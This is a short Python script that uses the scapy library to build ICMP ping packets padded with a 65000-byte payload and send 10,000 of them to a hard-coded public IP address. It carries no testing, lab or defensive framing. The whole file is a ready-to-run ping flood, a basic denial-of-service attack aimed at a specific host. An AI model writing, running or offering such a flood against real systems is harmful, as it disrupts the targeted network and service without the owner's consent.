from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort

def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size: int = 65000):
    ip = IP(dst=target_ip_address)
    icmp = ICMP()
    raw = Raw(b"X" * size)
    p = ip / icmp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size) + ' size to ' + target_ip_address)


ip = "103.21.220.17"
port = 443 #https port
send_ping(ip, number_of_packets_to_send=10000)